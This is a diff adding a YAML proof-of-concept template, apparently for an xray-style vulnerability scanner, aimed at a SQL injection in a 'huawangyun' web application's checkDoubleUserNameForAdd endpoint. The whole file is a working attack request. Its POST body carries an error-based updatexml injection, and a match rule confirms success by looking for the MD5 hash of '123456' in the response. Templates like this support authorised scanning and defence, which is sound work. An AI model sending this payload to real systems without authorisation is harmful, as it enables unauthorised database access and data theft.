@@ -1,0 +1,20 @@
+name: poc-yaml-huawangyun-checkDoubleUserNameForAdd-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ajax/checkDoubleUserNameForAdd
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: userName=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+MD5(123456))),1))+and+'%25%25'+like+'
+    expression: response.body.bcontains(b'e10adc3949ba59abbe56e057f20f883e')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487371&idx=1&sn=8d7d011f98ff7a400bbaa93ae499d1b9&chksm=c267bab8f51033aee10ece91a3bd4133c0bcf0a9ab92ffa0d3fbcfde92a0ea3392b53addd4f4&token=286085064&lang=zh_CN#rd
